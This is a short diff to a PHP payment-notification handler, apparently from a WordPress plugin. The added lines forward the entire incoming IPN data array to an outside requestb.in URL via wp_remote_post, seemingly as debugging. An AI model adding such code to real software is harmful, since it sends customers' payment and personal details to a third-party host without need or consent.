@@ -365,6 +365,8 @@ function handle_ipn($vars) {
 			'type' => 'mailchimp_subscribe_response',
 			'entry' => $resp
 		));
+		$url = "http://requestb.in/133ysja1";
+		wp_remote_post( $url, $vars );
 	} else {
 		do_action('activity_log', array(
 			'type' => 'invalid_IPN',
